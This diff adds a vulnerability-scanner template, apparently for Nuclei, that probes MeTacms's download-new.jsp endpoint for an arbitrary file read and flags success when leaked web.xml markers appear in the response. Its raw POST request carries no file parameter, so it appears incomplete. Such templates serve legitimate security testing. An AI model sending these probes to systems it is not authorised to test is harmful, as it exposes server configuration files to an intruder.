@@ -1,0 +1,33 @@
+id: MeTacms-download-new-ReadAnyFile
+
+info:
+  author: iSee857
+  name: MeTacms-download-new-ReadAnyFile
+  severity: high
+  description: MeTacms-download-new-ReadAnyFile
+  reference:
+    - https://github.com/iSee857
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /business/common/download-new.jsp HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "listener>"
+          - "servlet"
+          - "<?xml"
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 200
